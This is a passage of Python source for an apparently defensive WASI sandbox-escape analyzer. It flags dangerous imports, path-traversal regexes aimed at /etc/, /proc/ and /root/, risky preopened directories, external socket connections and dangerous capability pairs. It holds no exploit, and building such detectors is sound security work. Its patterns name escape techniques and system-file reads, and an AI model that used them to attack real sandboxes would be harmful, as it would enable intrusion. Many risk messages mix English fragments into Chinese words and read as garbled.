import logging, re, struct
from collections import defaultdict
from enum import Enum

try:
    from core.plugin_manager import BaseAnalyzer, AnalyzerMetadata, AnalyzerType
except ImportError:
    from plugin_fallback import BaseAnalyzer, AnalyzerMetadata, AnalyzerType

logger = logging.getLogger(__name__)

class WASISandboxType:
    """WASI沙箱运行时实现标识。"""
    WASMTIME = "wasmtime"
    WASMER = "wasmer"
    NODE_WASI = "node_wasi"
    WASMEDGE = "wasmedge"
    WAMR = "wamr"
    WASI_SDK = "wasi_sdk"
    LUCET = "lucet"
    WAVM = "wavm"
    BROWSER_WASI = "browser_wasi"
    CUSTOM = "custom"
    UNKNOWN = "unknown"

    _val = None
    def __init__(self, value):
        self._val = value
    @property
    def value(self):
        return self._val
    def __str__(self):
        return self._val

WASISandboxType.wasmedge_inst = WASISandboxType("wasmedge")
WASISandboxType.wavm_inst = WASISandboxType("wavm")
class EscapeVectorType(Enum):
    MEMORY_GROW_ABUSE = "memory_grow_abuse"
    TABLE_MANIPULATION = "table_manipulation"
    FD_PATH_TRAVERSAL = "fd_path_traversal"
    FD_PREOPEN_LEAK = "fd_preopen_leak"
    ENVIRON_LEAK = "environ_leak"
    ARGS_INJECTION = "args_injection"
    SOCKET_ABUSE = "socket_abuse"
    PROC_EXEC_ESCAPE = "proc_exec_escape"
    SIGNAL_ABUSE = "signal_abuse"
    RANDOM_ENTROPY_LEAK = "random_entropy_leak"
    CLOCK_TIMING_SIDE_CHANNEL = "clock_timing_side_channel"
    CAPABILITY_CONFUSION = "capability_confusion"
    IMPORT_FUNCTION_HIJACK = "import_function_hijack"
    LINEAR_MEMORY_OOB = "linear_memory_oob"
    STACK_OVERFLOW_ESCAPE = "stack_overflow_escape"
    INDIRECT_CALL_HIJACK = "indirect_call_hijack"
    RESOURCE_EXHAUSTION = "resource_exhaustion"
    UNKNOWN = "unknown"

class SeverityLevel:
    """漏洞严重性等级常量。"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"

class WASICapability:
    # WASI能力集权限标志常量
    FD_READ = "fd_read"
    FD_WRITE = "fd_write"
    FD_SEEK = "fd_seek"
    FD_TELL = "fd_tell"
    FD_FDSTAT = "fd_fdstat_get"
    FD_ADVISE = "fd_advise"
    FD_ALLOCATE = "fd_allocate"
    PATH_CREATE_DIRECTORY = "path_create_directory"
    PATH_SYMLINK = "path_symlink"
    PATH_LINK = "path_link"
    PATH_OPEN = "path_open"
    PATH_READLINK = "path_readlink"
    PATH_RENAME = "path_rename"
    PATH_FILESTAT = "path_filestat_get"
    PATH_REMOVE_DIRECTORY = "path_remove_directory"
    PATH_UNLINK_FILE = "path_unlink_file"
    SOCK_OPEN = "sock_open"
    SOCK_BIND = "sock_bind"
    SOCK_CONNECT = "sock_connect"
    SOCK_LISTEN = "sock_listen"
    SOCK_ACCEPT = "sock_accept"
    SOCK_SEND = "sock_send"
    SOCK_RECV = "sock_recv"
    SOCK_SHUTDOWN = "sock_shutdown"
    PROC_EXEC = "proc_exec"
    PROC_RAISE = "proc_raise"
    SCHED_YIELD = "sched_yield"
    RANDOM_GET = "random_get"
    CLOCK_TIME = "clock_time_get"
    ENVIRON_GET = "environ_get"
    ARGS_GET = "args_get"
    POLL_ONEOFF = "poll_oneoff"
    UNKNOWN = "unknown"

# 数据类定义

class WASIImportEntry:
    __slots__ = ('module_name', 'function_name', 'capability', 'param_count', 'return_count', 'is_dangerous', 'risk_reason',)

    def __init__(self, module_name, function_name, capability, param_count, return_count, is_dangerous=False, risk_reason=""):
        self.module_name = module_name
        self.function_name = function_name
        self.capability = capability
        self.param_count = param_count
        self.return_count = return_count
        self.is_dangerous = is_dangerous
        self.risk_reason = risk_reason

    def to_dict(self):
        return {
            "module_name": self.module_name,
            "function_name": self.function_name,
            "capability": self.capability.value,
            "param_count": self.param_count,
            "return_count": self.return_count,
            "is_dangerous": self.is_dangerous,
            "risk_reason": self.risk_reason,
        }

class MemoryGrowthPattern:
    __slots__ = ('initial_pages', 'maximum_pages', 'growth_count', 'total_allocated_pages', 'exceeds_guard', 'guard_size', 'is_suspicious', 'suspicion_reason', 'related_functions',)

    def __init__(self, initial_pages, maximum_pages, growth_count, total_allocated_pages, exceeds_guard=False, guard_size=0, is_suspicious=False, suspicion_reason="", related_functions=None):
        if related_functions is None:
            related_functions = []
        self.initial_pages = initial_pages
        self.maximum_pages = maximum_pages
        self.growth_count = growth_count
        self.total_allocated_pages = total_allocated_pages
        self.exceeds_guard = exceeds_guard
        self.guard_size = guard_size
        self.is_suspicious = is_suspicious
        self.suspicion_reason = suspicion_reason
        self.related_functions = related_functions

    def to_dict(self):
        return {
            "initial_pages": self.initial_pages,
            "maximum_pages": self.maximum_pages,
            "growth_count": self.growth_count,
            "total_allocated_pages": self.total_allocated_pages,
            "exceeds_guard": self.exceeds_guard,
            "guard_size": self.guard_size,
            "is_suspicious": self.is_suspicious,
            "suspicion_reason": self.suspicion_reason,
            "related_functions": self.related_functions,
        }

class TableManipulationPattern:
    __slots__ = ('table_index', 'initial_size', 'maximum_size', 'grow_operations', 'element_segments', 'indirect_calls_targeting', 'is_suspicious', 'suspicion_reason',)

    def __init__(self, table_index, initial_size, maximum_size, grow_operations, element_segments, indirect_calls_targeting, is_suspicious=False, suspicion_reason=""):
        self.table_index = table_index
        self.initial_size = initial_size
        self.maximum_size = maximum_size
        self.grow_operations = grow_operations
        self.element_segments = element_segments
        self.indirect_calls_targeting = indirect_calls_targeting
        self.is_suspicious = is_suspicious
        self.suspicion_reason = suspicion_reason

    def to_dict(self):
        return {
            "table_index": self.table_index,
            "initial_size": self.initial_size,
            "maximum_size": self.maximum_size,
            "grow_operations": self.grow_operations,
            "element_segments": self.element_segments,
            "indirect_calls_targeting": self.indirect_calls_targeting,
            "is_suspicious": self.is_suspicious,
            "suspicion_reason": self.suspicion_reason,
        }

class FDOperation:
    __slots__ = ('fd', 'operation', 'path', 'wasi_function', 'flags', 'is_preopened', 'is_dangerous', 'risk_description',)

    def __init__(self, fd, operation, path, wasi_function, flags=0, is_preopened=False, is_dangerous=False, risk_description=""):
        self.fd = fd
        self.operation = operation
        self.path = path
        self.wasi_function = wasi_function
        self.flags = flags
        self.is_preopened = is_preopened
        self.is_dangerous = is_dangerous
        self.risk_description = risk_description

    def to_dict(self):
        return {
            "fd": self.fd,
            "operation": self.operation,
            "path": self.path,
            "wasi_function": self.wasi_function,
            "flags": hex(self.flags),
            "is_preopened": self.is_preopened,
            "is_dangerous": self.is_dangerous,
            "risk_description": self.risk_description,
        }

class EscapeVector:
    __slots__ = ('vector_id', 'vector_type', 'severity', 'title', 'description', 'wasi_imports_involved', 'memory_pattern', 'table_pattern', 'fd_operations', 'exploit_difficulty', 'poc_code', 'remediation', 'cwe_id',)

    def __init__(self, vector_id, vector_type, severity, title, description, wasi_imports_involved=None, memory_pattern=None, table_pattern=None, fd_operations=None, exploit_difficulty="unknown", poc_code="", remediation="", cwe_id=""):
        if wasi_imports_involved is None:
            wasi_imports_involved = []
        if fd_operations is None:
            fd_operations = []
        self.vector_id = vector_id
        self.vector_type = vector_type
        self.severity = severity
        self.title = title
        self.description = description
        self.wasi_imports_involved = wasi_imports_involved
        self.memory_pattern = memory_pattern
        self.table_pattern = table_pattern
        self.fd_operations = fd_operations
        self.exploit_difficulty = exploit_difficulty
        self.poc_code = poc_code
        self.remediation = remediation
        self.cwe_id = cwe_id

    def to_dict(self):
        return {
            "vector_id": self.vector_id,
            "vector_type": self.vector_type.value,
            "severity": self.severity.value,
            "title": self.title,
            "description": self.description,
            "wasi_imports_involved": self.wasi_imports_involved,
            "memory_pattern": self.memory_pattern.to_dict() if self.memory_pattern else None,
            "table_pattern": self.table_pattern.to_dict() if self.table_pattern else None,
            "fd_operations": [f.to_dict() for f in self.fd_operations],
            "exploit_difficulty": self.exploit_difficulty,
            "poc_code": self.poc_code,
            "remediation": self.remediation,
            "cwe_id": self.cwe_id,
        }

class SandboxAssessment:
    __slots__ = ('sandbox_type', 'total_imports', 'dangerous_imports', 'capability_count', 'dangerous_capabilities', 'memory_risk', 'table_risk', 'fs_risk', 'network_risk', 'overall_risk', 'escape_vectors', 'risk_score',)

    def __init__(self, sandbox_type, total_imports, dangerous_imports, capability_count, dangerous_capabilities, memory_risk, table_risk, fs_risk, network_risk, overall_risk, escape_vectors, risk_score):
        self.sandbox_type = sandbox_type
        self.total_imports = total_imports
        self.dangerous_imports = dangerous_imports
        self.capability_count = capability_count
        self.dangerous_capabilities = dangerous_capabilities
        self.memory_risk = memory_risk
        self.table_risk = table_risk
        self.fs_risk = fs_risk
        self.network_risk = network_risk
        self.overall_risk = overall_risk
        self.escape_vectors = escape_vectors
        self.risk_score = risk_score

    def to_dict(self):
        return {
            "sandbox_type": self.sandbox_type.value,
            "total_imports": self.total_imports,
            "dangerous_imports": self.dangerous_imports,
            "capability_count": self.capability_count,
            "dangerous_capabilities": [c.value for c in self.dangerous_capabilities],
            "memory_risk": self.memory_risk.value,
            "table_risk": self.table_risk.value,
            "fs_risk": self.fs_risk.value,
            "network_risk": self.network_risk.value,
            "overall_risk": self.overall_risk.value,
            "escape_vectors": [v.to_dict() for v in self.escape_vectors],
            "risk_score": self.risk_score,
        }

# 分析组件

class WASIImportAnalyzer:
    # WASI导入分析器——解析并分类WASI导入函数
    # WASI snapshot preview1 完整API映射表
    WASI_API_MAP = {
        # 元组格式: (capability, param_count, return_count, is_dangerous, risk_reason)
        "args_get": (WASICapability.ARGS_GET, 2, 1, False, ""),
        "args_sizes_get": (WASICapability.ARGS_GET, 2, 1, False, ""),
        "environ_get": (WASICapability.ENVIRON_GET, 2, 0, True,
                        "environment variable可能泄露宿host敏感info (PATH/HOME/USER)"),
        "environ_sizes_get": (WASICapability.ENVIRON_GET, 2, 0, True,
                              "environment variablesizequery可用于information disclosure"),
        "clock_res_get": (WASICapability.CLOCK_TIME, 1, 1, False, ""),
        "clock_time_get": (WASICapability.CLOCK_TIME, 3, 1, True,
                          "高精度时钟可用于侧信道攻击"),
        "fd_advise": (WASICapability.FD_ADVISE, 4, 1, False, ""),
        "fd_allocate": (WASICapability.FD_ALLOCATE, 4, 0, False, ""),
        "fd_close": (WASICapability.FD_READ, 1, 0, False, ""),
        "fd_datasync": (WASICapability.FD_WRITE, 1, 0, False, ""),
        "fd_fdstat_get": (WASICapability.FD_FDSTAT, 1, 1, False, ""),
        "fd_fdstat_set_flags": (WASICapability.FD_FDSTAT, 2, 0, False, ""),
        "fd_filestat_get": (WASICapability.PATH_FILESTAT, 1, 1, False, ""),
        "fd_filestat_set_size": (WASICapability.FD_WRITE, 2, 0, False, ""),
        "fd_filestat_set_times": (WASICapability.FD_WRITE, 4, 0, False, ""),
        "fd_pread": (WASICapability.FD_READ, 4, 1, False, ""),
        "fd_prestat_get": (WASICapability.FD_FDSTAT, 1, 1, False, ""),
        "fd_prestat_dir_name": (WASICapability.FD_FDSTAT, 2, 0, True,
                                "预打开directory名泄露宿hostfilesystem结构"),
        "fd_pwrite": (WASICapability.FD_WRITE, 4, 1, False, ""),
        "fd_read": (WASICapability.FD_READ, 3, 1, False, ""),
        "fd_readdir": (WASICapability.FD_READ, 3, 1, True,
                       "directory读取可能遍历预打开directory外的file"),
        "fd_renumber": (WASICapability.FD_WRITE, 2, 0, True,
                        "fd重编号可能绕过能力limit"),
        "fd_seek": (WASICapability.FD_SEEK, 3, 1, False, ""),
        "fd_sync": (WASICapability.FD_WRITE, 1, 0, False, ""),
        "fd_tell": (WASICapability.FD_TELL, 1, 1, False, ""),
        "fd_write": (WASICapability.FD_WRITE, 3, 1, False, ""),
        "path_create_directory": (WASICapability.PATH_CREATE_DIRECTORY, 3, 0, True,
                                  "directorycreate可能用于权限绕过"),
        "path_filestat_get": (WASICapability.PATH_FILESTAT, 4, 1, True,
                              "pathstatusquery可能泄露filesystem布局"),
        "path_filestat_set_times": (WASICapability.PATH_FILESTAT, 6, 0, False, ""),
        "path_link": (WASICapability.PATH_LINK, 5, 0, True,
                      "硬链接create可能绕过pathlimit"),
        "path_open": (WASICapability.PATH_OPEN, 9, 1, True,
                      "path打开是filesystem逃逸的主要vector"),
        "path_readlink": (WASICapability.PATH_READLINK, 4, 1, True,
                          "符号链接读取可揭示filesystem结构"),
        "path_remove_directory": (WASICapability.PATH_REMOVE_DIRECTORY, 2, 0, True,
                                  "directorydelete可能造成沙箱denial of service"),
        "path_rename": (WASICapability.PATH_RENAME, 4, 0, True,
                        "file重命名可能绕过pathlimit"),
        "path_symlink": (WASICapability.PATH_SYMLINK, 3, 0, True,
                         "符号链接create是filesystem逃逸的关keyvector"),
        "path_unlink_file": (WASICapability.PATH_UNLINK_FILE, 2, 0, True,
                             "filedelete可能影响沙箱完整性"),
        "poll_oneoff": (WASICapability.POLL_ONEOFF, 3, 1, False, ""),
        "proc_exit": (WASICapability.PROC_EXEC, 1, 0, False, ""),
        "proc_raise": (WASICapability.PROC_RAISE, 1, 0, True,
                       "signalsend可能影响宿hostprocess"),
        "sched_yield": (WASICapability.SCHED_YIELD, 0, 0, False, ""),
        "random_get": (WASICapability.RANDOM_GET, 2, 1, True,
                       "随机数获取可能泄露宿host熵池status"),
        "sock_open": (WASICapability.SOCK_OPEN, 3, 1, True,
                      "套接字打开开启network逃逸通道"),
        "sock_bind": (WASICapability.SOCK_BIND, 3, 0, True,
                      "套接字绑定可能create未授权service"),
        "sock_connect": (WASICapability.SOCK_CONNECT, 3, 0, True,
                         "套接字connect可能建立C2通道"),
        "sock_listen": (WASICapability.SOCK_LISTEN, 2, 0, True,
                        "监听套接字可能接受外部connect"),
        "sock_accept": (WASICapability.SOCK_ACCEPT, 2, 1, True,
                        "接受connect可能引入外部攻击者"),
        "sock_recv": (WASICapability.SOCK_RECV, 4, 1, True,
                      "networkreceive可能import恶意data"),
        "sock_send": (WASICapability.SOCK_SEND, 4, 1, True,
                      "networksend可能泄露data"),
        "sock_shutdown": (WASICapability.SOCK_SHUTDOWN, 2, 0, False, ""),
        "sock_getopt": (WASICapability.SOCK_OPEN, 3, 1, False, ""),
        "sock_setopt": (WASICapability.SOCK_OPEN, 4, 0, False, ""),
        "sock_getlocaladdr": (WASICapability.SOCK_BIND, 2, 0, True,
                              "本地address泄露可能暴露network拓扑"),
        "sock_getpeeraddr": (WASICapability.SOCK_ACCEPT, 2, 0, True,
                             "对端address泄露"),
    }

    # 非标准WASI但常见的危险导入函数
    NONSTANDARD_DANGEROUS_IMPORTS = {
        "system": "直接system调用可完全绕过沙箱",
        "exec": "processexecute可逃逸沙箱",
        "execve": "processexecute可逃逸沙箱",
        "fork": "process分叉可create不受沙箱控制的子process",
        "clone": "process克隆可绕过沙箱隔离",
        "mmap": "memory映射可能突破沙箱memoryboundary",
        "munmap": "memory释放可能导致UAF逃逸",
        "mprotect": "memory保护修改可createRWX页面",
        "ptrace": "process追踪可inject代码到宿host",
        "chroot": "根directory切换可逃逸filesystem沙箱",
        "chdir": "directory切换可能遍历沙箱外path",
        "dlopen": "动态库load可引入恶意代码",
        "ioctl": "设备控制可操作宿host硬件",
        "kill": "signalsend可能影响宿hostprocess",
        "setuid": "privilege escalation可逃逸权限沙箱",
        "setgid": "privilege escalation可逃逸权限沙箱",
    }

    @classmethod
    def analyze(cls, imports):
        # 分析WASI导入列表
        if imports is None:
            return []

        lst_entries = []

        # 导入表遍历——显式while循环
        i_idx = 0
        i_len = len(imports)
        while i_idx < i_len:
            imp = imports[i_idx]
            sz_module = imp.get("module", "")
            sz_func_name = imp.get("name", imp.get("function", ""))

            # 审计范围：wasi_、env等已知模块
            sz_normalized_module = sz_module.lower().replace("wasi_snapshot_preview1", "wasi")
            if "wasi" not in sz_normalized_module and sz_module not in ("env", "unknown", ""):
                # 非标准模块危险导入审计
                if sz_func_name.lower() in cls.NONSTANDARD_DANGEROUS_IMPORTS:
                    sz_reason = cls.NONSTANDARD_DANGEROUS_IMPORTS[sz_func_name.lower()]
                    lst_entries.append(WASIImportEntry(
                        module_name=sz_module,
                        function_name=sz_func_name,
                        capability=WASICapability.UNKNOWN,
                        param_count=0,
                        return_count=0,
                        is_dangerous=True,
                        risk_reason=sz_reason,
                    ))
                i_idx += 1
                continue

            # WASI标准API匹配
            if sz_func_name in cls.WASI_API_MAP:
                cap, params, rets, dangerous, reason = cls.WASI_API_MAP[sz_func_name]
                lst_entries.append(WASIImportEntry(
                    module_name=sz_module,
                    function_name=sz_func_name,
                    capability=cap,
                    param_count=params,
                    return_count=rets,
                    is_dangerous=dangerous,
                    risk_reason=reason,
                ))
            else:
                # 未知导入——来源为WASI模块
                lst_entries.append(WASIImportEntry(
                    module_name=sz_module,
                    function_name=sz_func_name,
                    capability=WASICapability.UNKNOWN,
                    param_count=0,
                    return_count=0,
                    is_dangerous=False,
                    risk_reason="",
                ))
            i_idx += 1

        return lst_entries

class MemoryEscapeAnalyzer:
    # 内存逃逸分析器——检测线性内存与Table操作的逃逸模式

    # 内存逃逸可疑模式正则
    SUSPICIOUS_PATTERNS = [
        (re.compile(r"memory\.grow", re.IGNORECASE), "memory_grow",
         "memory.grow 调用可能尝试突破沙箱分配的memory上限"),
        (re.compile(r"memory\.size", re.IGNORECASE), "memory_size",
         "memory.size 被用于探测沙箱memoryboundary"),
        (re.compile(r"table\.grow", re.IGNORECASE), "table_grow",
         "table.grow 可能用于劫持间接调用target"),
        (re.compile(r"i32\.load\s+offset=0x[fF]{3,}", re.IGNORECASE), "hi_offset_load",
         "高offset量load可能访问 guard page 之外的memory"),
        (re.compile(r"i32\.store\s+offset=0x[fF]{3,}", re.IGNORECASE), "hi_offset_store",
         "高offset量存储可能破坏 guard page 之外的memory"),
        (re.compile(r"call_indirect", re.IGNORECASE), "call_indirect",
         "间接调用可能被用于劫持control flow"),
    ]

    @classmethod
    def analyze_memory_growth(cls, wasm_sections):
        # 内存增长模式分析
        if wasm_sections is None:
            wasm_sections = {}

        memory_section = wasm_sections.get("memory", {})
        i_initial = memory_section.get("initial", 256)
        i_maximum = memory_section.get("maximum", 65536)

        # 校验最大页数边界——缺失时视为无上限
        b_has_max = memory_section.get("has_max", True if i_maximum > 0 else False)
        i_growth_ops = wasm_sections.get("memory_grow_ops", 0)
        i_total_allocated = wasm_sections.get("total_allocated_pages", i_initial)
        i_guard = wasm_sections.get("guard_size", 65536)  # 默认64KB guard

        b_is_suspicious = False
        lst_reasons = []

        # 检测1：memory无上限——此为常见触发点
        if not b_has_max or i_maximum == 0:
            b_is_suspicious = True
            lst_reasons.append("memory无最大页数limit，允许无限增长")

        # 检测2：内存分配接近或超过guard page
        i_page_size = 65536  # 64KB per page
        if i_total_allocated * i_page_size > i_guard:
            b_is_suspicious = True
            lst_reasons.append(f"memory分配({i_total_allocated}页)超过guard区域({i_guard}字节)")

        # 检测3：memory.grow调用频次过高
        if i_growth_ops > 100:
            b_is_suspicious = True
            lst_reasons.append(f"大量memory增长操作({i_growth_ops}次)，可能探测boundary")

        # 检测4：初始内存极小而增长幅度异常
        if i_initial < 16 and i_total_allocated > 1000:
            b_is_suspicious = True
            lst_reasons.append(f"memory从{i_initial}页爆炸增长至{i_total_allocated}页")

        # 检测5：内存分配超过4GB（65536页），可能触发整数溢出
        if i_total_allocated > 65536:
            b_is_suspicious = True
            lst_reasons.append(f"memory分配超过4GB ({i_total_allocated}页)，可能导致integer overflow")

        return MemoryGrowthPattern(
            initial_pages=i_initial,
            maximum_pages=i_maximum if b_has_max else 0,
            growth_count=i_growth_ops,
            total_allocated_pages=i_total_allocated,
            exceeds_guard=(i_total_allocated * i_page_size > i_guard),
            guard_size=i_guard,
            is_suspicious=b_is_suspicious,
            suspicion_reason="; ".join(lst_reasons) if lst_reasons else "无exception",
        )

    @classmethod
    def analyze_table_manipulation(cls, wasm_sections):
        # Table操作模式分析
        if wasm_sections is None:
            wasm_sections = {}

        table_section = wasm_sections.get("table", {})
        i_initial = table_section.get("initial", 0)
        i_maximum = table_section.get("maximum", 0)
        i_grow_ops = wasm_sections.get("table_grow_ops", 0)
        i_elem_segments = wasm_sections.get("element_segments", 0)
        i_indirect_calls = wasm_sections.get("indirect_calls", 0)

        b_is_suspicious = False
        lst_reasons = []

        # 检测1：table.grow与call_indirect共存
        if i_grow_ops > 0 and i_indirect_calls > 0:
            b_is_suspicious = True
            lst_reasons.append("table.grow 与 call_indirect 共存，可能用于间接调用劫持")

        # 检测2：Table无最大大小限制
        if i_maximum == 0 and i_initial > 0:
            b_is_suspicious = True
            lst_reasons.append("Table无最大sizelimit，允许无限增长")

        # 检测3：元素段数量异常
        if i_elem_segments > 50:
            b_is_suspicious = True
            lst_reasons.append(f"大量元素段({i_elem_segments}个)，可能覆盖关key函数index")

        # 检测4：Table大小超出合理范围
        if i_initial > 10000 or (i_maximum > 0 and i_maximum > 100000):
            b_is_suspicious = True
            lst_reasons.append(f"Tablesizeexception (初始{i_initial}, 最大{i_maximum})")

        # 检测5：非零偏移元素段计数
        lst_elem_offsets = wasm_sections.get("element_offsets", [])

        i_nonzero_count = 0
        i_off_idx = 0
        i_off_len = len(lst_elem_offsets)
        while i_off_idx < i_off_len:
            if lst_elem_offsets[i_off_idx] > 0:
                i_nonzero_count += 1
            i_off_idx += 1

        if i_nonzero_count > 10:
            b_is_suspicious = True
            lst_reasons.append(f"大量非零offset元素段({i_nonzero_count}个)")

        return TableManipulationPattern(
            table_index=0,
            initial_size=i_initial,
            maximum_size=i_maximum,
            grow_operations=i_grow_ops,
            element_segments=i_elem_segments,
            indirect_calls_targeting=i_indirect_calls,
            is_suspicious=b_is_suspicious,
            suspicion_reason="; ".join(lst_reasons) if lst_reasons else "无exception",
        )

    @classmethod
    def scan_bytecode_for_patterns(cls, bytecode_text):
        # 字节码可疑模式扫描
        if bytecode_text is None:
            return []

        lst_findings = []
        i_idx = 0
        i_len = len(cls.SUSPICIOUS_PATTERNS)
        while i_idx < i_len:
            pattern, ptype, desc = cls.SUSPICIOUS_PATTERNS[i_idx]
            matches = pattern.findall(bytecode_text)
            if matches:
                lst_findings.append({
                    "pattern_type": ptype,
                    "description": desc,
                    "match_count": str(len(matches)),
                })
            i_idx += 1
        return lst_findings

class FileSystemEscapeAnalyzer:
    # 文件系统逃逸分析器——检测WASI fd操作中的路径穿越

    # 路径穿越模式
    PATH_TRAVERSAL_PATTERNS = [
        (re.compile(r"\.\./|\.\.\\"), "父directory遍历 (../)"),
        (re.compile(r"^/etc/"), "systemconfiguredirectory访问 (/etc/)"),
        (re.compile(r"^/proc/"), "processfilesystem访问 (/proc/)"),
        (re.compile(r"^/sys/"), "内核 sysfs 访问 (/sys/)"),
        (re.compile(r"^/dev/"), "设备file访问 (/dev/)"),
        (re.compile(r"^/root/"), "root用户directory访问 (/root/)"),
        (re.compile(r"^/tmp/"), "临时directory访问 (/tmp/), 可能用于DLL劫持"),
        (re.compile(r"^/var/run/"), "run时directory访问 (/var/run/)"),
        (re.compile(r"^C:\\Windows\\", re.IGNORECASE), "Windowssystemdirectory访问"),
        (re.compile(r"\.sh$|\.bash$|\.py$|\.pl$"), "脚本file访问"),
        (re.compile(r"\.so$|\.dll$|\.dylib$", re.IGNORECASE), "动态库file访问"),
    ]

    # 危险文件描述符集合
    DANGEROUS_FD_NUMBERS = {0, 1, 2, 3, 4, 5}  # stdin/stdout/stderr及常用预打开fd

    @classmethod
    def analyze_fd_operations(cls, fd_trace):
        # 文件描述符操作序列分析
        if fd_trace is None:
            return []

        lst_operations = []
        set_preopened_fds = set()

        i_idx = 0
        i_len = len(fd_trace)
        while i_idx < i_len:
            entry = fd_trace[i_idx]
            i_fd = entry.get("fd", -1)
            sz_op = entry.get("operation", "")
            sz_path = entry.get("path", "")
            sz_func = entry.get("wasi_function", "")
            i_flags = entry.get("flags", 0)
            b_is_preopen = entry.get("is_preopened", False)

            if b_is_preopen:
                set_preopened_fds.add(i_fd)

            # 危险操作审计
            b_is_dangerous = False
            lst_risk_desc = []

            # 检查1：路径穿越
            j_idx = 0
            j_len = len(cls.PATH_TRAVERSAL_PATTERNS)
            while j_idx < j_len:
                pattern, desc = cls.PATH_TRAVERSAL_PATTERNS[j_idx]
                if pattern.search(sz_path):
                    b_is_dangerous = True
                    lst_risk_desc.append(f"path穿越: {desc}")
                j_idx += 1

            # 检查2：非预打开fd的文件操作
            if i_fd not in set_preopened_fds and sz_op in ("read", "write", "open") and sz_path:
                b_is_dangerous = True
                lst_risk_desc.append(f"对非预打开fd {i_fd} execute {sz_op} 操作")

            # 检查3：path_open与危险路径组合
            if sz_func == "path_open" and sz_path:
                # 检查oflags中O_CREAT标志（创建文件）
                if i_flags & 0x01:  # O_CREAT equivalent
                    b_is_dangerous = True
                    lst_risk_desc.append("path_open 使用 O_CREAT 标志createfile")

                # 检查权限掩码是否为全权限
                i_fs_rights = entry.get("fs_rights_base", 0)
                if i_fs_rights & 0xFFFFFFFFFFFFFFFF == 0xFFFFFFFFFFFFFFFF:  # 全权限
                    b_is_dangerous = True
                    lst_risk_desc.append("path_open request全部filesystem权限")

            # 检查4：fd_renumber可能绕过fd权限限制
            if sz_func == "fd_renumber":
                b_is_dangerous = True
                lst_risk_desc.append("fd_renumber 可能用于绕过fd权限limit")

            # 检查5：path_symlink创建符号链接
            if sz_func == "path_symlink":
                b_is_dangerous = True
                lst_risk_desc.append("path_symlink create符号链接可能导致沙箱外访问")

            lst_operations.append(FDOperation(
                fd=i_fd,
                operation=sz_op,
                path=sz_path,
                wasi_function=sz_func,
                flags=i_flags,
                is_preopened=b_is_preopen,
                is_dangerous=b_is_dangerous,
                risk_description="; ".join(lst_risk_desc) if lst_risk_desc else "未detected风险",
            ))
            i_idx += 1

        return lst_operations

    @classmethod
    def detect_preopen_abuse(cls, preopens):
        # 预打开目录滥用检测
        if preopens is None:
            return []

        lst_findings = []

        dangerous_dirs = {
            "/": "根directory预打开 — 完全filesystem访问",
            "/etc": "systemconfiguredirectory",
            "/home": "用户主directory",
            "/root": "root主directory",
            "/tmp": "临时directory",
            "/var": "可变datadirectory",
            "/proc": "processfilesystem",
            "/sys": "内核sysfs",
            "/dev": "设备file",
            "/mnt": "挂载点",
            "/media": "可移动媒体",
            "C:\\": "Windows根directory",
        }

        i_idx = 0
        i_len = len(preopens)
        while i_idx < i_len:
            preopen = preopens[i_idx]
            sz_path = preopen.get("path", "")
            b_found = False
            # 遍历危险目录字典，命中则中断
            for danger_path, reason in dangerous_dirs.items():
                if sz_path == danger_path or sz_path.startswith(danger_path + "/"):
                    lst_findings.append({
                        "preopen_path": sz_path,
                        "risk": reason,
                        "severity": "CRITICAL" if sz_path == "/" else "HIGH",
                    })
                    b_found = True
                    break
            i_idx += 1

        if not lst_findings and preopens:
            lst_findings.append({
                "preopen_path": str([p.get("path", "") for p in preopens]),
                "risk": "非标准预打开directory，需手动审计",
                "severity": "MEDIUM",
            })

        return lst_findings

class NetworkEscapeAnalyzer:
    """网络逃逸分析器——检测WASI socket网络逃逸"""

    @classmethod
    def analyze_socket_usage(cls, socket_operations):
        # Socket操作安全性分析
        if socket_operations is None:
            socket_operations = []

        dct_result = {
            "total_sockets": 0,
            "listen_sockets": 0,
            "connect_attempts": 0,
            "external_connections": [],
            "bind_addresses": [],
            "risks": [],
        }

        i_idx = 0
        i_len = len(socket_operations)
        while i_idx < i_len:
            op = socket_operations[i_idx]
            sz_func = op.get("wasi_function", "")

            if sz_func == "sock_open":
                dct_result["total_sockets"] += 1
                i_sock_type = op.get("sock_type", 0)
                # SOCK_RAW（类型3）为最高危套接字类型
                if i_sock_type == 3:
                    dct_result["risks"].append({
                        "type": "raw_socket",
                        "description": "original套接字 (SOCK_RAW) 可构造任意network包",
                        "severity": "CRITICAL",
                    })

            elif sz_func == "sock_bind":
                sz_addr = op.get("address", "")
                i_port = op.get("port", 0)
                dct_result["bind_addresses"].append(f"{sz_addr}:{i_port}")
                if i_port < 1024:
                    dct_result["risks"].append({
                        "type": "privileged_port",
                        "description": f"绑定特权port {i_port}",
                        "severity": "HIGH",
                    })

            elif sz_func == "sock_connect":
                sz_addr = op.get("address", "")
                i_port = op.get("port", 0)
                dct_result["connect_attempts"] += 1

                # 外部连接检测
                localhost_patterns = ["127.", "0.0.0.0", "::1", "localhost"]
                b_is_external = not any(p in sz_addr for p in localhost_patterns)
                if b_is_external:
                    dct_result["external_connections"].append({
                        "address": sz_addr,
                        "port": i_port,
                        "risk": "外部networkconnect可能用于C2通信",
                    })

            elif sz_func == "sock_listen":
                dct_result["listen_sockets"] += 1
                dct_result["risks"].append({
                    "type": "listening_socket",
                    "description": "监听套接字可接受外部connect",
                    "severity": "MEDIUM",
                })
            i_idx += 1

        return dct_result

class CapabilityModelAnalyzer:
    # 能力安全模型分析器——基于WASI能力的权限模型评估

    # 危险能力组合
    DANGEROUS_CAPABILITY_COMBOS = [
        ((WASICapability.PATH_OPEN, WASICapability.FD_WRITE), "path_open + fd_write: 可写入沙箱外file", SeverityLevel.CRITICAL),
        ((WASICapability.PATH_OPEN, WASICapability.PATH_SYMLINK), "path_open + path_symlink: 可create符号链接绕过pathlimit", SeverityLevel.CRITICAL),
        ((WASICapability.SOCK_OPEN, WASICapability.SOCK_CONNECT), "sock_open + sock_connect: 可建立外部networkconnect", SeverityLevel.HIGH),
        ((WASICapability.SOCK_OPEN, WASICapability.SOCK_BIND), "sock_open + sock_bind: 可绑定port接受connect", SeverityLevel.HIGH),
        ((WASICapability.PATH_OPEN, WASICapability.PATH_RENAME), "path_open + path_rename: 可移动/重命名file", SeverityLevel.HIGH),
        ((WASICapability.PATH_OPEN, WASICapability.PATH_LINK), "path_open + path_link: 可create硬链接逃逸", SeverityLevel.HIGH),
